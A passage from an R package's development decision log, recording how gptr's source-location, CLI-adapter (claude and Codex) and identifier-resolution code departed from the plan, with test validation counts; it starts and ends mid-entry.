   round 2).** The plan fell back to the console site whenever a finder saw a running document
   (a `source()` frame, knitr or Quarto, `Rscript --file=`) but none of its statements held the
   call: a call inside a function (a package helper, or one defined in the script without
   srcrefs), a later pass of a top-level loop under `Rscript` (the execution counter ran past
   the file's rows) or an evaluated text. With a transcript target that call became a top-level
   console turn: with `gptr_doc("analysis.R")`, sourcing `f = function() gptr("inner")`,
   `inner = f()` with `keep.source = FALSE` gave `kind = "console"`, `path` analysis.R itself,
   `call$top_level = TRUE`, so Task 11 would have appended `s_<hex> = gptr("inner")` to the
   script, and Task 13's route (whose console question runs on a `NULL` site) would have asked
   about it interactively. With srcrefs the same call was a nested `srcref` site. Now the first
   finder that sees a running document decides: `doc_locate()` returns that document's site
   (`doc_site_base()`, shared with `doc_site_finish()`) with no statement, anchor or block and
   `top_level = FALSE` (`format` NA for a document gptr cannot record into, such as a sourced
   `.txt` file), neither the IDE's buffer nor the console is consulted, and `call$top_level` is
   `FALSE`, with or without srcrefs and whether or not a transcript target exists. Task 13's
   route then skips the call (`!isTRUE(site$top_level) && is.null(site$in_block)`), as do the
   `doc.s1_block` and `doc.replay` services. Only a failing IDE location (a heuristic: the
   active editor is no proof that the call came from it) still falls back to the console, and
   console calls nested in functions stay transcript turns (plan review row 16). So that the
   IDE finder still sees RStudio's Source of a dirty or unsaved buffer, the `source()` frame
   finder now ignores `.active-rstudio-document` (the rule `doc_srcfile_path()` already applies
   to srcrefs, 03 section 6.9.3): that copy of the buffer is no document, and the call is
   located in the editor as the plan's fall-through did.
7. **A relative `Rscript --file=` is resolved from the launch directory (review round 3).** The
   plan resolved the script's path against the working directory. After the script called
   `setwd()`, none of its later `gptr()` calls were located, so they were never recorded or
   replayed: they ran live on every execution under `auto`, and P08's guard refused them under
   `replay`. A file of the same name in the new directory was taken as the script.
   `doc_rscript_file()` now tries the launch directory first. On Unix, R's front end `bin/R` is
   a `/bin/sh` script, and sh exports the actual working directory as PWD at startup (checked
   with a stale and with an unset PWD); `setwd()` does not change it. The working directory is
   the fallback, as in the plan: on Windows, or when PWD is not absolute. The file must still
   exist and have the `r` format. R CMD check runs tests through `R CMD BATCH`, which passes
   `-f file`, not `--file=`, so it is unaffected.
8. **A computed prompt whose value equals a literal prompt is located as its own call (contract
   7.15: matched by content; review round 4).** Task 2's `doc_calls_have()` prefers the rows
   with the runtime prompt hash and uses the call only when there are none. With
   `q = "count rows"`, `a = gptr(q)`, `b = gptr("count rows")`, the call `gptr(q)` was therefore
   located at `b`'s statement wherever no statement narrows the search: under `Rscript` (where
   `b`'s own call then exhausted the counter and became a nested site, so it was never
   recorded), in an IDE buffer with the cursor on `a`, in a knitr or Quarto chunk and in a
   notebook. The same held inside one statement (`out = gptr(q) |> gptr("count rows")` under
   `source()`). The locator now uses `doc_call_rows()`: when rows are the evaluated call itself
   and none of the prompt-hash rows is, it takes those rows. A literal-prompt call is unchanged,
   because its own rows are in both sets.
9. **A script sourced with `chdir = TRUE` is found from the directory it was sourced from
   (review round 4).** `source()` and `sys.source()` read the file and then change to its
   directory, so a relative `ofile` or `file` no longer exists from there, and the plan's
   `source()` frame finder skipped the frame. Without srcrefs such a call was not located (in an
   interactive or `Rscript -e` session with a transcript target it became a top-level console
   turn), and a file of the same relative name below the new directory was taken as the script.
   Both functions keep the directory they were called from as `owd` in their frame;
   `doc_frame_file()` resolves a relative path against it.

Also, without a behaviour change: the site keeps `stmt`, `in_block`, `block` and `anchor` as
named `NULL` fields (contract 7.15 lists them), where the plan's `site$x = NULL` dropped them.
`doc_command_args()` wraps `commandArgs(FALSE)` so the `Rscript` finder can be tested in
process.

Test side (review round 3; like the asserted fixture copy of progress item 0): every test process
started by `Rscript <file>` is an `Rscript --file=` run, so under item 6 a call that file does not
hold is nested there instead of reaching the console. The plan's tests "without srcrefs the
source() frame locates the statement, unless switched off" and "calls in no document go to the
console transcript target, if any", and the addition "a malformed session or context item never
stops the console fallback", passed only when the runner was given as a relative path that no
longer resolved after `local_project()` changed the working directory. With an absolute runner
path they gave `[ FAIL 9 | WARN 0 | SKIP 0 | PASS 137 ]`. The test file's helper
`local_no_running_document()` mocks `doc_command_args()` (no `--file=`) and
`doc_ide_available()` (FALSE, for an interactive run in an IDE whose editor holds the test file).
Each of these three tests calls it: one added line in each plan test.

Known limits, kept as planned: under `Rscript` the per-(file, call) counter cannot tell a
`gptr()` call inside a top-level loop from a later top-level call with the same prompt. Under
knitr and Quarto there is no file srcref and no counter, so two identical calls in one chunk
(`a = gptr("x")` then `b = gptr("x")`) are both located as the first: the second owns, replays
or replaces the first one's agent chunk. The same holds for two identical calls in notebook
cells. The srcref finder searches the frames below the call: a script sourced without srcrefs
from a statement that has srcrefs and holds a call with the same prompt
(`x = c(source("helper.R", keep.source = FALSE)$value, gptr("count rows"))`, with
`h = gptr("count rows")` in `helper.R`) has its call located at that statement
(`task8-fix4-probe.log`). Stopping the search at a `source()` frame would mis-locate a promise
forced inside the sourced script instead, so the plan's search is kept.

Validation: `progress/P15.md`, Task 8. Red (no `R/doc-locate.R`) `^doc-locate$`
`[ FAIL 14 | WARN 0 | SKIP 0 | PASS 0 ]` (`dev/.validation/P15/task8-red.log`). Against the
plan-literal source swapped into the namespace (`task8-adapt-harness.R`, with
`task8-plan-literal-seam.R`, which only adds the `doc_command_args()` seam), 74 expectations ran:
7 failed and 3 tests errored, all in the adaptation tests (`task8-adapt-red.log`). Green
`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 89 ]`, the same under `LC_ALL=C` (`task8-green.log`,
`task8-green-clocale.log`). Review round 1 added three tests (+25 expectations): red
`[ FAIL 4 | WARN 0 | SKIP 0 | PASS 104 ]` (`task8-fix1-red.log`), then green
`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 114 ]`, the same under `LC_ALL=C` (`task8-fix1-green.log`,
`task8-fix1-green-clocale.log`). Review round 2 added three tests and changed one expectation
(+32 expectations): red `[ FAIL 14 | WARN 0 | SKIP 0 | PASS 126 ]` (`task8-fix2-red.log`); after
the first change the RStudio buffer-copy test failed 6 times (`task8-fix2-red-rstudio.log`; it
passes on the earlier loop, `task8-fix2-rstudio-pre.log`); then green
`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 146 ]`, the same under `LC_ALL=C` (`task8-fix2-green.log`,
`task8-fix2-green-clocale.log`). Review round 3 added one test (+7 expectations) and the helper:
with an absolute runner path, red was `[ FAIL 9 | WARN 0 | SKIP 0 | PASS 137 ]` before the helper
(`task8-fix3-red-abs.log`) and `[ FAIL 4 | WARN 0 | SKIP 0 | PASS 149 ]` with it, before item 7
(`task8-fix3-red.log`). Green was `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 153 ]` with both an absolute
and a relative runner path, and the same under `LC_ALL=C` (`task8-fix3-green-abs.log`,
`task8-fix3-green.log`, `task8-fix3-green-clocale.log`). Review round 4 added five tests (+49
expectations): red `[ FAIL 31 | WARN 0 | SKIP 0 | PASS 171 ]` (`task8-fix4-red.log`), green
`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 202 ]` with a relative and an absolute runner path, and the
same under `LC_ALL=C` (`task8-fix4-green.log`, `task8-fix4-green-abs.log`,
`task8-fix4-green-clocale.log`). The plan expects 49.

## D-104 - P20 cli-claude normaliser: unreported usage and cost stay unknown, no R condition escapes the normaliser and an error there stops the child, control answers are built before they are sent, a queued tools/call of an ended turn is refused, the wall clock of an aborted run ends the turn as aborted and stops the child, and a turn P05 ended without its normaliser never acts on the session's next turn (2026-10-04)

P20 Task 6's plan-literal normaliser in `R/cli-claude.R` changed in six ways (item 6 also in
two helpers of P20 Task 4's `R/cli-common.R`); the plan's eight tests, its test support and its
three fixtures are verbatim (`claude-call2.ndjson` equals report
07 section 3.14 except the two `<-` the plan writes as `=`):

1. **Unreported usage and cost are unknown (IC-74; D-015 point 3).** `pcli_claude_usage()` built
   `usage_new(..., cost = list(total = pcli_claude_cost(...)))`: without `total_cost_usd` the
   cost had a `NA` total but zero components, and with it the four components were the
   constructor's legacy zeros although the CLI reports only the total; a `result` line without
   any cache field had a known `cache_write_1h = 0`. Now the cost is `NULL` (usage_new()'s
   `cost_unknown()`) when the CLI reported no cost, and `list(input = NA, output = NA,
   cache_read = NA, cache_write = NA, total = <increase>)` when it did; a reported `0` stays a
   known zero. A bare `cache_creation_input_tokens` still counts as 5-minute writes with
   `cache_write_1h = 0` (07 section 3.5); without it both are unknown. A count or
   `total_cost_usd` that is not one finite nonnegative number is unknown (the plan passed a
   string to `usage_new()`, which aborts, and `as.numeric("0.5")` became a cost), and an invalid
   total leaves the child's cost baseline unchanged.
2. **No R condition escapes the normaliser (contract 8.1).** The plan's `push()`, `finish()`
   and `fail()` were unguarded: a malformed `result` line (a non-string `terminal_reason` made
   `startsWith()` fail; a non-number count made `usage_new()` abort) signalled an R error from
   `push()`, and a numeric `stop_reason` picked a `switch()` alternative by position. The three
   functions now turn an error into the turn's one terminal `error` event (class `internal`), as
   P12's `adp_normaliser()` does, and `stop_reason`, `terminal_reason`, `subtype` and the init
   line's `model` are read only when they are one string (`pcli_claude_chr()`). An error in
   `push()` also stops the child (`pcli_stop_child(state, wait_ack = FALSE)`, after the turn
   closed, so no interrupt): the CLI may still be working on the turn, and the terminal event
   finishes P05's stream, so P05 no longer drops the child as it does for an error escaping
   `push()` (`stream_fail_live()`), the next turn's `stream_process()` does not let go of a
   finished turn, and with `turn_open = FALSE` builtin:cli's `agent_end` hook would leave it
   running; `pcli_claude_build()` would then reuse it and the next turn would read the earlier
   turn's late output and cost (review round 1).
3. **A queued `tools/call` of an ended turn is refused.** The FIFO job of an `mcp_message`
   `tools/call` checked only the abort flag, so when the per-turn wall clock ended the turn (and
   stopped the child) while the job waited in P04's tool FIFO, which runs jobs whether or not
   their run has settled, the R code was still evaluated through `opts$mcp_dispatch` for a turn
   that had already failed. The job now answers "The gptr turn is over." without dispatching.
4. **The wall clock of an aborted run ends the turn as aborted.** `pcli_claude_timeout()` set
   `s$done` without a terminal event or message in an aborted run, so `finish()` and `fail()`
   then returned `NULL` (contract 8.1: the final assistant message) and the wire log had no
   terminal line. It now calls `pcli_fail(s, "aborted", ...)` (one terminal event, the
   message, the wire-log line) and then stops the child without an interrupt
   (`pcli_stop_child(state, wait_ack = FALSE)` after the turn closed). In the plan the
   unfinished stream made the next turn's `stream_process()` let go of the child; the terminal
   event finishes the stream, `run_abort()` has cancelled P05's abort watch, and `agent_end`
   stops only a child whose turn is open, so without the stop the next turn reused the aborted
   turn's child (review round 1).
5. **Control answers are built before they are sent.** The plan passed the answer to
   `pcli_send()` as an unevaluated argument (`pcli_send(opts, pcli_control_ok(id,
   pcli_claude_permission(req, opts)))`), so it was computed only when the transport's `send()`
   forced it, inside `pcli_send()`'s `tryCatch()` and, in P05's `stream_send()`, after its
   finished and process checks: an R error while computing it (a non-string `tool_name` in
   `startsWith()`, a gate result that is not a list, a JSON-RPC error for a `message` that is not
   an object) was swallowed, no `control_response` was written and the CLI waited for it until
   `gptr.cli_turn_timeout` (default 3600 s); the gate also ran inside the write path.
   `pcli_claude_control()` and `pcli_claude_mcp()`'s `answer()` now build the response first, so
   such an error reaches `push()` and ends the turn as in item 2 (review round 1).
6. **A turn P05 ended without its normaliser never acts on the session's next turn.** The
   adapter state is the session's (per provider), and P05 often ends a `process_jsonl` turn
   without telling the normaliser (`stream_abort()` through `stream_over()`, `stream_detach()` of
   a settled run or of an earlier unfinished turn, a failure of its driver after `parse()`). The
   turn's wall-clock timer then stayed armed for `gptr.cli_turn_timeout` (3600 s by default) and,
   when it fired during a later turn, `pcli_fail()` -> `pcli_finish()` set `turn_open = FALSE`
   and `turn_timer = NULL` in the shared state and `pcli_stop_child()` stopped the later turn's
   child; P05 had cancelled that child's watcher, so the later turn saw no exit and hung until
   its own wall clock, then failed as out of budget (review round 2, reproduced through P05's
   `provider_stream()` with the fake claude; item 4 made the aborted case, the usual end of an
   abort, stop the child). A `tools/call` of such a turn still in P04's tool FIFO was evaluated
   too. Now P20 Task 4's `pcli_turn_timer()` cancels a timer still recorded in the state before
   it arms the new turn's (P05 starts a turn only after letting go of the earlier one), and the
   new `pcli_turn_current(s)` (the turn's timer id is still the state's `turn_timer`, which
   `pcli_finish()` and `pcli_stop_child()` clear) guards `pcli_claude_timeout()` and the FIFO job
   of `pcli_claude_mcp()`: a turn that is no longer current does nothing on its wall clock and
   answers a queued `tools/call` with "The gptr turn is over." without dispatching it. Both
   helpers are in `R/cli-common.R`, so Task 8's `pcli_codex_timeout()` (which ends the turn with
   `kill = TRUE`) should check `pcli_turn_current(s)` the same way.

Not changed and recorded here (D-019 item 5): the control responses go through P05's
`opts$send()`, which writes with `write_all()`; a `tools/call` answer carries the tool's result
(text truncated by the tool layer, plots as base64), so on Windows the write blocks until the CLI
has read it. The CLI is waiting for that answer and reads its stdin, so the expected effect is a
short pause, not a hang (not verified on Windows).

Validation: `progress/P20.md`, Task 6. Seven tests added (+72 expectations). Against the
plan-literal source the plan's tests pass (`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 119 ]`,
`dev/.validation/P20/task6-plan-literal.log`) and the first four added tests fail
(`[ FAIL 13 | WARN 0 | SKIP 0 | PASS 126 ]`, `task6-adapt-red.log`); review round 1 added the
child-stop assertions and the fifth test (`[ FAIL 9 | WARN 0 | SKIP 0 | PASS 151 ]` before the
fix, `task6-fix1-red.log`); review round 2 added the sixth and seventh tests
(`[ FAIL 14 | WARN 0 | SKIP 0 | PASS 177 ]` before the fix, `task6-fix2-red.log`); then
`^cli-claude$` `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 191 ]` (`task6-fix2-green.log`), so every
later plan count for `test-cli-claude.R` is 86 higher (14 from D-101, 72 from D-104).

## D-105 - P08 identifiers: agent definitions written as gptr_agent() or gptr::gptr_agent() take their list names, a mode is exactly one of the four and is refused without echoing the value, an exact name wins over a normalised spelling (bare and in the alias mask, where a spelling of several names stays unbound), empty or missing aliases never enter the identifier pool, agent names are checked against P06's accessor list, and a function written inline in a mask, or made there by a factory, keeps the mask as its scope without its alias bindings (2026-10-04)

P08 Task 6's literal `R/gptr-capture.R` (identifier resolution, contract 6.1.3; the
`identifier.resolve` service) is kept, with these differences, which Task 8 (`gptr()`), Task 9
(`gateway_run()`) and P17/P19 (agent definitions) consume:

1. **`agents = list(stats = gptr_agent(...))` and `gptr::gptr_agent(...)`** take their list names
   like `agent(...)` does (`agents_is_definition()`). IC-42 has package-facing documentation and
   package code write `gptr::gptr_agent()`, and contract 6.1 names agents by their list names;
   the plan passed the list name only into calls headed `agent`, so the package form failed in
   P02's `spec_finish()` with `gptr_error_invalid_spec` ("field 'name' must be a non-empty
   string"). A name the call gives itself is still kept (`agents_own_name()`): gptr_agent() has
   no dots and `name` is its first formal, so R binds to it an argument named `name` or a prefix
   of it, or else the first non-empty unnamed argument wherever it stands. The plan (and review
   rounds 1-2) looked only at the first argument, so `lit = agent(description = "Lit", "stats")`
   became `name = "lit"` with `"stats"` silently bound to `model`, `agent(nam = "x")` failed with
   "unused argument", and `agent(, model = opus)` kept no name and failed in `spec_finish()`
   (review round 3).
2. **`mode` is exactly one of the four and is refused without its value** (contract 1.1: an
   `invalid_argument` message never includes the argument's value). The plan's message ended
   `not "<value>"`, and the value may come from a variable (`mode = !!x`). The plan also checked
   only `all(x %in% modes)`, so `mode = c(plan, auto)`, `mode = character()`, a bound vector of
   two modes and `mode = +plan` resolved (contract 6.1: one of `plan`, `manual`, `edits`,
   `auto`), and Task 8's `mode_tighter()` would then fail with a raw R error. `ident_check_chr()`
   now wants length 1 for `mode`, and the new `ident_whole()` checks the element-wise results of
   `c()`/`list()` and `+name`/`-name` as a whole; an empty `c()` stays `NULL` (the default).
3. **An exact name wins, bare and in the alias mask; a spelling of several names is bound to
   none.** For skills, plugins, extensions and agents the mask also binds the `_` and `.`
   spellings of a `-` name (IC-42: `name_norm()` maps both to `-`; the plan bound only `_`, so
   `single.cell` resolved bare but not inside a call). The plan let such a spelling overwrite a
   registered name spelt exactly so (`single_cell` read as `single-cell` although `single_cell`
   is registered). `ident_mask_vals()` now binds a spelling only when it is not itself a known
   name and `name_norm()` maps it to exactly one known name, computed across both separators: a
   spelling that normalises to several names (`single_cell` with `single-cell` and
   `single.cell` registered; `a_b.c` with `a-b.c` and `a_b-c`) stays unbound in the mask
   (`object not found`), just as the bare symbol is `gptr_error_invalid_identifier` listing the
   candidates (contract 6.1.3). `identifier_match()` likewise returns an exact name before it
   compares normalised names, so a bare `single_cell` is `"single_cell"` when that name is
   registered next to `single-cell`, as the string `"single_cell"` and the mask already were; a
   name that is no known name still lists every normalised match, as the plan's test expects.
   Spellings other than the uniform `_` and `.` ones (`Single_Cell`) resolve bare only.
4. **Empty or missing names never enter the identifier pool.** A provider alias `""` made every
   alias-mask evaluation fail in `list2env()` ("attempt to use zero-length variable name") and
   made `identifier_known("", "model")` TRUE; `NA` became a binding named `"NA"`.
5. **`session_accessor_names()` returns P06's `session_accessors`** instead of a third copy of
   the IC-71 list (P02's `kind_check_agent()` keeps its own, as L0 may not read L3); a test checks
   that P02 refuses every one of them as an agent name.
6. **A function written inline in a mask, or made there by a factory, keeps the mask as its
   scope, without its alias bindings (a narrow exception to rule R3, 03 section 6.4).**
   Contract 6.1 lets `extensions` take `function(gptr)` factories and `tools` lists of
   `<spec:tool>`, and Task 8 sends these expressions to `resolve_identifier()` (only symbols
   and `I()` are forced). A closure created while the alias
   mask (or the agents mask) is evaluated has the mask as its environment, so the plan's
   unconditional `parent.env(mask) = emptyenv()` left `extensions = function(gptr) {...}`,
   `extensions = c("audit", function(gptr) ...)`, `tools = list(gptr_tool(..., execute =
   function(input, ctx) ...))` and an agent's inline tool unable to find any function, not even
   `{`. The same held for closures a helper constructor makes in the mask (`tools =
   list(make_tool(con))`, `extensions = make_ext(k)`): their environment is the constructor's
   frame, whose arguments stay promises of the mask until forced, so the first call failed with
   `object 'k' not found`; and for a wrapper that forces a function written inline
   (`extensions = wrap(function(gptr) ...)`). `ident_mask()` and `resolve_agents()` now detach
   the mask, on error too, unless the returned value can reach it (`ident_holds_env()`,
   `ident_env_reaches()`): through a closure's environment, an environment, a list element or an
   attribute (a formula's `.Environment`), and for every environment on the way up to the
   caller or a named environment (global, base, empty, namespaces, attached packages) through
   its bound values. An unforced promise, non-empty dots and an active binding count as
   reaching the mask, because base R cannot read a promise's environment and active bindings
   are never called. The one exception is the default of an unsupplied formal
   (`ident_lazy_default()`: `make_ext = function(level = 1) function(gptr) level` called as
   `make_ext()`, or a tool constructor `function(n = 3) gptr_tool(..., execute = function(input,
   ctx) n)`). R evaluates that promise in the factory's own frame, which the walk covers, and
   `missing()` recognises it without forcing anything: for an unforced binding `missing()` is
   TRUE only for such a default or for an argument forwarded from a frame where it is missing
   without a default, which fails when forced whether or not the mask is attached (R does not
   pass a default's missingness on, so a forwarded default counts as supplied and keeps the
   mask). The walk records visited environments by address (rule R2), and nesting deeper than
   64 or more than 100000 steps counts as reaching. Erring this way is not free: a mask kept
   although nothing reaches it still points at the caller's frame when that frame's function
   returns, so R skips the frame's cleanup and the caller's arguments stay marked as shared;
   their next in-place change copies them (IC-41, 03 section 6.4), and `gc()` does not undo
   this. Review round 3 found this for every factory whose result held only lazy defaults
   (`analyse = function(df) gptr("x", df, extensions = somepkg::panel())` called as
   `analyse(big)`: the next in-place edit of `big` copied it); those masks are now detached.
   A kept mask loses the bindings it was given that still hold their value (the alias
   strings; `agent` in the agents mask), so
   the functions it scopes see the caller's variables as after direct evaluation (a user's `r`
   is no longer the string `"r"` inside an inline tool); names the expression assigned itself
   stay. A promise of the mask forced later therefore also reads an alias name from the caller.
   R3 detaches masks so that a garbage mask never pins the caller's frame; a function the user
   wrote inline, or a promise a factory holds, references that frame through R's own scoping,
   exactly as direct evaluation would (with the same effect on the caller's arguments). Every
   other mask is still detached (tests for a plain result, a refused function, a function bound
   outside the mask, a package function, and factories whose results hold only lazy defaults).

IC-74 adds no behaviour here: identifier resolution reads only catalog aliases and registry names
and never discovers or prepares a model (07-local-ollama.md section 2.1); a test mocks P05's
`catalog_discover()`, `catalog_ollama_discover()` and `model_prepare()` to fail and resolves
`model` and `system1` identifiers.

Validation: `progress/P08.md`, Task 6. Red (no source) `^gptr-capture$`
`[ FAIL 14 | WARN 0 | SKIP 0 | PASS 178 ]` (`dev/.validation/P08/task6-red.log`); against the
plan-literal source `[ FAIL 5 | WARN 0 | SKIP 0 | PASS 274 ]`
(`task6-red-adaptations-against-plan-literal.log`, every failure in the adaptation tests); first
green `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 289 ]` (`task6-green.log`). Review round 1 (items 2, 3
and 6): red `[ FAIL 15 | WARN 0 | SKIP 0 | PASS 291 ]` (`task6-fix1-red.log`), green
`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 320 ]` (`task6-fix1-green.log`; the plan's 6 tests add
exactly its 31 expectations, the adaptation tests 111). Review round 2 (items 3 and 6): the 14
regression checks one per test against the round-1 source `[ FAIL 14 | WARN 0 | SKIP 0 | PASS 0 ]`
(`task6-fix2-red-granular.log`) and `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 14 ]` with the fix
(`task6-fix2-green-granular.log`); in the test file red `[ FAIL 2 | WARN 0 | SKIP 0 | PASS 317 ]`
(`task6-fix2-red.log`), green `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 342 ]`
(`task6-fix2-green-1.log`; the adaptation tests now add 133). Review round 3 (items 1 and 6):
the 11 regression checks one per test against the round-2 source
`[ FAIL 7 | WARN 0 | SKIP 0 | PASS 4 ]` (`task6-fix3-red-granular.log`) and
`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 11 ]` with the fix (`task6-fix3-green-granular.log`); in the
test file red `[ FAIL 5 | WARN 0 | SKIP 0 | PASS 337 ]` (`task6-fix3-red.log`), green
`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 357 ]` (`task6-fix3-green.log`; the adaptation tests now add
148).

## D-106 - P20 cli-codex adapter: Codex's unreported cost and usage stay unknown, the turn cap is always a whole number, a late or aborted wall clock follows the claude adapter, no R condition escapes the normaliser, malformed events are read by their JSON types, the Windows sandbox probe caches answers and timeouts only, the control-file check never fails an exec, and every workspace-write exec is checked (2026-10-04)

P20 Task 7's plan-literal `R/cli-codex.R` changed in eight ways (item 6 also in one line of P20
Task 2's `pcli_version_forget()` in `R/cli-common.R`). The plan's thirteen tests, its test
support (`stub_mcp_handle()`, `local_mcp_stub()`) and its five fixtures are verbatim
(`codex-call1.jsonl` equals report 08 section 5.2):

1. **Codex's cost is unknown and so are counts it does not report (IC-74; D-015 point 3).**
   `pcli_codex_usage()` called `usage_new()` without `cost`, so every exec recorded the
   constructor's legacy known zero cost, and `pcli_num()` turned an absent or malformed count
   into a known 0 (a `"many"` became 0, and `-1` reached `usage_new()`, which aborts). Codex
   reports no cost, so the cost is now `NULL` (unknown, `cost_unknown()`); a count that is not one
   finite nonnegative number is `NA`; the uncached input (`input_tokens` minus cached and
   cache-write tokens, 08 section 3.9) is `NA` when a part is unknown or the parts exceed the total
   (the plan clamped it to a known 0); a reported cache-write count is all 5-minute writes with
   `cache_write_1h = 0`, and without one both are unknown (as the claude CLI's bare
   `cache_creation_input_tokens`, D-104 item 1); a `usage` that is not an object is unknown.
   Reported zeros stay known zeros.
2. **The turn cap is always a whole number of at least 1.** `max(1L, as.integer(par$turns))`
   turned a remaining budget of `Inf` (which `pcli_params()` passes through) or one above the
   integer range into `NA` with an R warning inside `build()`, and the normaliser's
   `s$items > s$cap` then failed with an R error on the first tool step. A budget that is not
   finite now counts as none (as the claude flags, D-101 item 1) and the cap falls back to
   `gptr.max_turns`; a value above the integer range is `.Machine$integer.max`; a
   `gptr.max_turns` that is not a positive number gives the default 50 (`Inf` means no
   practical cap).
3. **A late or aborted wall clock follows the claude adapter (D-104 items 4 and 6).**
   `pcli_codex_timeout()` now returns at once when its exec is no longer the session's current
   turn (`pcli_turn_current()`, as D-104 item 6 asked of this function): P05 can end an exec
   without its normaliser and the session's next exec shares the adapter state, so the old
   timer would have closed the new turn and stopped its child. In an aborted run the wall clock,
   and a line that still reaches the normaliser, end the exec as `aborted` (the plan reported
   `timeout`, or ended it without stopping the child) and stop the child
   (`pcli_codex_abort()`): once the terminal event has finished P05's stream nothing else lets
   go of it, and a `workspace-write` Codex would go on editing unsupervised.
4. **No R condition escapes the normaliser (contract 8.1; as D-104 item 2).** `push()`,
   `finish()` and `fail()` turn an R error into the exec's one terminal `error` event (class
   `internal`); an error in `push()` also stops the exec, which may still be working.
5. **Malformed events are read by their JSON types.** An `item` that is not an object, a
   `changes` entry without a path string, an `error` given as a string (`turn.failed`) and a
   non-string `type`, `status`, `thread_id`, `server`, `tool`, `command` or `query` made the
   plan's normaliser fail with "subscript out of bounds" or let `switch()` pick an alternative
   by position. They are now read only with the 08 section 3.9 types (`pcli_codex_chr()`,
   `pcli_codex_why()`): anything else is ignored or unknown, and a `file_change` lists only the
   paths it names.
6. **The Windows sandbox probe caches answers and timeouts only.** `pcli_codex_windows_ready()`
   cached a run that could not start as "not ready" for the rest of the process, and
   `gptr_providers(check = TRUE)` never probed again. A run that could not start or ended
   without an exit status now counts as not ready for this exec only and is not cached (as for
   the other probes, D-095 item 1). A run that timed out is still cached as not ready, as in the
   plan (review round 1): `build()` runs the probe synchronously, so asking again would hold
   every auto-mode exec for the 60 s timeout. `pcli_version_forget()` drops the cached answer
   with the capability probe, so `gptr_providers(check = TRUE)` asks again. The probe command
   itself stays UNCERTAIN (plan self-review ambiguity 9; nothing ran on Windows).
7. **The control-file check never fails an exec, and runs once Codex is stopped (review round
   1; contract 8.1, IC-54, IC-65).** The plan's `pcli_control_hash()` hashed every listed entry
   with `hash_file()`, which fails on a symbolic link whose target is gone (the recursive listing
   of `.git/hooks`, `.gptr/extensions`, `plugins` and `agents` keeps those) and on a file gptr
   cannot read. Every `workspace-write` exec in such a project then failed in `build()`, a
   completed answer became an `internal` error at `turn.completed`, and in the wall-clock
   callback (the one normaliser entry point P05 does not call) the error reached only the
   reactor's diagnostic: no terminal event, the exec left open and Codex running without its
   timer. Now each entry is hashed on its own (`pcli_control_digest()`); one that cannot be
   hashed gets a marker that still changes with it (`link:<target>`, else
   `unreadable:<size> <modification time>`), and a fixed control path that is a dangling link is
   listed too. A check that fails anyway gives no paths and its reason
   (`pcli_codex_after()`), so the exec ends with its terminal event and the
   `gptr_warning_cli_sandbox` warning says the files were not checked. The wall clock is wrapped
   as `push()` is (`internal` terminal event, Codex stopped). When gptr stops an exec (turn cap,
   wall clock, an aborted run, an R error in `push()` or the wall clock) it stops Codex before it
   checks the control files and before the terminal event, so nothing Codex writes between the
   check and the kill goes unreported and P06's done callback finds the child gone. (Until review
   round 2 the two R-error ends did not check the control files at all; see item 8.)
8. **Every workspace-write exec is checked, also one that ends without the normaliser's own
   end (review round 2; IC-54, IC-65).** The check ran only on the normaliser's own terminal
   paths (`turn.completed`, `pcli_codex_error()`). P05 ends an exec of an aborted or settled run
   without the normaliser (`stream_abort()`, `stream_detach()`), a stop of the child cancels the
   exec's wall clock (`pcli_stop_child()`, as Task 9's `agent_end` hook will), and the
   normaliser's own `internal` end (an R error in `push()`, the wall clock, `finish()` or
   `fail()`) called `pcli_fail()` directly. The baseline then stayed in the adapter state and
   the session's next `build()` replaced it, so Codex's edits became part of the new baseline
   and were never reported; for `.Rprofile`, `Rprofile.site`, `Renviron.site` and `.git/hooks`
   this warning is gptr's only notice. Now (a) `build()` first checks a baseline still set
   (`pcli_codex_settle()`) and warns, before `start`, that Codex's earlier workspace-write turn
   ended unchecked and which files changed since it started (by Codex or a later edit); (b) the
   `internal` end checks the control files after the stop and warns after its terminal event,
   and neither may signal there; (c) a check result is kept on the exec until it is reported
   (`pcli_codex_report()`), so an R error between the check and the warning cannot lose it;
   (d) the baseline records the project root it was hashed in (`codex_root`), and the check
   hashes that root, so a session that moved to another project between execs does not get the
   control files of both projects reported as changed. Residual: an aborted
   exec of a session that runs no later codex exec is reported only by its own late wall clock
   (up to `gptr.cli_turn_timeout`, while gptr pumps), and not at all once a stop of the child
   has cancelled that clock; Task 9's `agent_end` and `session_shutdown` hooks can close this by
   calling `pcli_codex_settle(state)` after `pcli_stop_child()`. The trust-gated files (settings,
   `mcp.json`, extensions, agents) are covered in any case by P08's trust fingerprint.

Not changed and recorded here (D-019 item 5): the prompt goes to Codex through P05's
`write_all()`; a fresh thread's prompt carries gptr's instructions and the earlier conversation,
so it is not bounded and on Windows the write blocks until Codex has read it (Codex reads stdin to
the end before it starts the turn, so the expected effect is a short pause; not verified on
Windows).

Validation: `progress/P20.md`, Task 7. Fifteen tests added (+155 expectations). Against the
plan-literal source the plan's tests pass (`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 71 ]`,
`dev/.validation/P20/task7-plan-literal.log`) and the first seven added tests fail
(`[ FAIL 22 | WARN 4 | SKIP 0 | PASS 95 ]`, `task7-adapt-red.log`); the five of review round 1
(and the probe test's new timeout case) failed against the round-0 source
(`[ FAIL 6 | WARN 0 | SKIP 0 | PASS 155 ]`, `task7-fix1-red.log`; the unreadable-file test
`[ FAIL 2 | WARN 0 | SKIP 0 | PASS 178 ]` with the round-0 `pcli_control_hash()`,
`task7-fix1-red-unreadable.log`); the three of review round 2 failed against the round-1
source (`[ FAIL 6 | WARN 0 | SKIP 0 | PASS 194 ]`, `task7-fix2-red.log`; with the root of item
8 (d) ignored `[ FAIL 2 | WARN 0 | SKIP 0 | PASS 224 ]`, `task7-fix2-red-root.log`); final
`^cli-codex$` `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 226 ]` (`task7-fix2-green.log`), so every later
